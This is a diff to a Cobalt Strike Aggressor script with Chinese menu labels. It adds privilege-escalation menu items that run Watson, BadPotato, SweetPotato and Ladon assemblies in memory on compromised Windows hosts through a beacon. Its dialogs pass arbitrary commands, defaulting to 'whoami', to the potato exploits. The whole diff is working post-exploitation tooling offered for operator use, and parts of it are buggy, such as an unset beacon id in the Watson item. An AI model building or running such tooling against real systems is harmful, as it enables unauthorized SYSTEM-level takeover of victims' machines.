@@ -1,14 +1,49 @@
 menu "☆ 权限提升" {
-    item "Watson (获取可提权漏洞)" {
+    item "SharpWatson (获取可提权漏洞)" {
 		    blog($1, "\c9=========== Watson (获取可提权漏洞) ==========");
         show_message("适用版本：\nWindows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004 \nServer 2016 & 2019\n项目地址：https://github.com/rasta-mouse/Watson");
         bexecute_assembly($bid, script_resource("/scripts/AuthPromote/Watson.exe"), "");
     }
     item "BadPotato (BeichenDream)" {
 				blog($1, "\c9=========== BadPotato (BeichenDream) ==========");
-        show_message("适用版本：\nWindows 8-10 Windows 2012-2019 \n项目地址：https://github.com/BeichenDream/BadPotato");
-        bexecute_assembly($1, script_resource('/scripts/AuthPromote/BadPotato.exe'), "whoami");
+        $bid = $1['@'];
+        $dialog = dialog("BadPotato (BeichenDream)", %(exec => "whoami",bid => $bid), &BadPotato_BeichenDream);
+        dialog_description($dialog, "适用版本：\nWindows 8-10 Windows 2012-2019 \n项目地址：https://github.com/BeichenDream/BadPotato");
+        drow_text($dialog, "exec", "参数：");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);        
     }
+    sub BadPotato_BeichenDream{
+        $arg = join(' ', @($3['exec']));
+        bexecute_assembly($bid, script_resource("/scripts/AuthPromote/BadPotato.exe"), $arg);
+    }
+
+    item "BadPotato (Ladon)" {
+        $bid = $1;
+        $dialog = dialog("Ladon BadPotato", %(tar => "",moudle => "BadPotato",clrver => "35",bid => $bid), &LadonLpe);
+        dialog_description($dialog, "Command: whoami");
+        drow_text($dialog, "b64cmd",  "Command:");
+        dbutton_action($dialog, "Start");
+        dialog_show($dialog);
+    }
+
+    item "SweetPotato (Ladon)" {
+        $bid = $1;
+        $dialog = dialog("Ladon SweetPotato", %(tar => "",moudle => "SweetPotato",clrver => "35",bid => $bid), &LadonLpe);
+        dialog_description($dialog, "Command: whoami");
+        drow_text($dialog, "b64cmd",  "Command:");
+        dbutton_action($dialog, "Start");
+        dialog_show($dialog);
+    }
+    sub LadonLpe {
+      blog2($bid,"Ladon ".$3['moudle']." ".$3['b64cmd']);
+      if (-exists script_resource("/scripts/InfoCollect/Ladon.exe")) {
+      if ($3['moudle'] eq "BadPotato"){
+      bexecute_assembly!($bid, script_resource("/scripts/AuthPromote/res/Ladon40.dat"),$3['moudle']." ".$3['b64cmd']);
+      }else{bexecute_assembly!($bid, script_resource("/scripts/AuthPromote/res/Ladon20.dat"),$3['moudle']." ".$3['b64cmd']);}
+      }else {berror($bid, "Ladon.exe does not exist :(");}
+    }
+
     item "SweetPotato（MS16-075）" {
 				blog($1, "\c9=========== SweetPotato（MS16-075） ==========");
         $bid = $1['@'];
